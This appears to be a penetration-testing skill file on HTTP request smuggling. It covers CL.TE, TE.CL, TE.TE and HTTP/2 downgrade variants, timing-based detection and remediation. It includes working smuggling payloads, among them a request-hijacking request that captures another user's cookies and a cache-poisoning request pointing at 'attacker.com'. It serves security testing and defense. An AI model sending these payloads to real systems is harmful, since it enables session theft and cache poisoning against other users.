---
name: http-request-smuggling
description: HTTP Request Smuggling testing covering CL.TE, TE.CL, TE.TE desync variants, HTTP/2 downgrade, and cache poisoning techniques
---

# HTTP Request Smuggling

HTTP Request Smuggling exploits disagreements between front-end and back-end servers on where one HTTP request ends and the next begins. This desynchronization allows an attacker to prepend arbitrary content to the next user's request, enabling cache poisoning, credential hijacking, authentication bypass, and request routing manipulation.

## Attack Surface

**Types**
- CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
- TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
- TE.TE: both support Transfer-Encoding but one can be tricked into ignoring it
- HTTP/2 downgrade: HTTP/2 front-end translates to HTTP/1.1 for back-end
- H2C smuggling: cleartext HTTP/2 upgrade abuse

**Contexts**
- Load balancers (ALB, ELB, HAProxy, Nginx), CDNs (Cloudflare, Akamai, Fastly), reverse proxies, API gateways, WAFs

**Defenses to Bypass**
- Request normalization, strict parsing modes, HTTP/2 end-to-end

## Core Mechanism

When two HTTP processors in a chain disagree about request boundaries, an attacker crafts a request containing an embedded second request. The front-end sees one request; the back-end sees two. The "smuggled" portion becomes the prefix of the next legitimate request processed by the back-end.

## Key Vulnerabilities

### CL.TE

Front-end trusts `Content-Length`, back-end prefers `Transfer-Encoding: chunked`:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
The front-end forwards 13 bytes (including `0\r\n\r\nSMUGGLED`). The back-end sees chunked encoding, processes the `0` chunk (end), and treats `SMUGGLED` as the start of the next request.

### TE.CL

Front-end trusts `Transfer-Encoding`, back-end trusts `Content-Length`:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```
The front-end reads until the final `0` chunk. The back-end reads only 3 bytes per Content-Length and leaves `SMUGGLED\r\n0\r\n\r\n` in the buffer for the next request.

### TE.TE (Obfuscation)

Both support Transfer-Encoding, but one fails to parse obfuscated variants:
```
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked\x00
Transfer-Encoding:
 chunked
Transfer-Encoding: identity, chunked
```

### HTTP/2 Downgrade Smuggling

When an HTTP/2 front-end downgrades to HTTP/1.1 for the back-end:
- **H2.CL**: inject `Content-Length` header in HTTP/2 request that disagrees with the body
- **H2.TE**: inject `Transfer-Encoding: chunked` in HTTP/2 (normally prohibited but some proxies pass it through)
- **CRLF in H2 headers**: inject `\r\n` in HTTP/2 header values to create additional HTTP/1.1 headers after downgrade

```
:method: POST
:path: /
:authority: target.com
header: value\r\nTransfer-Encoding: chunked\r\n
```

## Detection Techniques

### Timing-Based Detection

**CL.TE Detection:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
If CL.TE, the back-end waits for the next chunk after `A`, causing a timeout.

**TE.CL Detection:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
If TE.CL, the back-end reads beyond the `0` chunk terminator per Content-Length, causing a timeout.

### Differential Responses

Send a smuggled request that triggers a different response (404, redirect) for the next request. Compare behavior when the smuggled prefix alters the path or Host header of a subsequent request.

## Exploitation

### Request Hijacking

Smuggle a partial request that captures the next user's request as a body parameter:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 73
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Length: 500

data=
```
The next user's request (with cookies, auth headers) becomes the value of `data=`.

### Cache Poisoning

Smuggle a request that returns a different response, which the CDN caches for a shared URL:
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: [calculated]

0

GET /static/main.js HTTP/1.1
Host: attacker.com

```

### Authentication Bypass

Smuggle a request that inherits the next user's session cookies or auth headers processed by the back-end.

### WAF Bypass

The WAF (front-end) sees a benign request; the smuggled portion contains the malicious payload processed by the back-end without WAF inspection.

## Testing Methodology

1. **Identify architecture** — determine if there are multiple HTTP processors (CDN, LB, reverse proxy, app server)
2. **Timing probes** — send CL.TE and TE.CL detection payloads and observe timeout differences
3. **TE obfuscation** — test Transfer-Encoding header variants to find parsing disagreements
4. **Confirm desync** — use differential responses (smuggled 404, redirect, or reflected content)
5. **HTTP/2 testing** — if front-end supports H/2, test header injection and CL/TE disagreement after downgrade
6. **Escalate impact** — demonstrate cache poisoning, request hijacking, or auth bypass

**Tools:**
- Burp Suite HTTP Request Smuggler extension
- `smuggler.py` for automated detection
- Manual crafting with raw sockets or `printf | nc` / `openssl s_client`

## Indicators of Vulnerability

- Timeout differences between CL.TE and TE.CL probe requests
- Unexpected 400/404/405 responses on subsequent requests after a smuggling probe
- Response content belonging to a different request (captured headers/cookies)
- Multiple HTTP processors in the request path with different parsing behavior
- CDN/proxy allowing both Content-Length and Transfer-Encoding on the same request

## Remediation

- Use HTTP/2 end-to-end; avoid HTTP/1.1 downgrade between components
- Reject ambiguous requests with both Content-Length and Transfer-Encoding
- Normalize and validate request parsing at the front-end before forwarding
- Use the same HTTP parsing library across all components where possible
- Enable strict parsing modes on load balancers and proxies
- Disable connection reuse between front-end and back-end where feasible
- Monitor for desync indicators: unexpected 400s, request correlation anomalies

## Summary

HTTP Request Smuggling exploits the gap between two HTTP parsers in a chain. Detection relies on timing differentials and response anomalies. Impact ranges from cache poisoning to full request hijacking. The root fix is consistent HTTP parsing across all components or end-to-end HTTP/2.
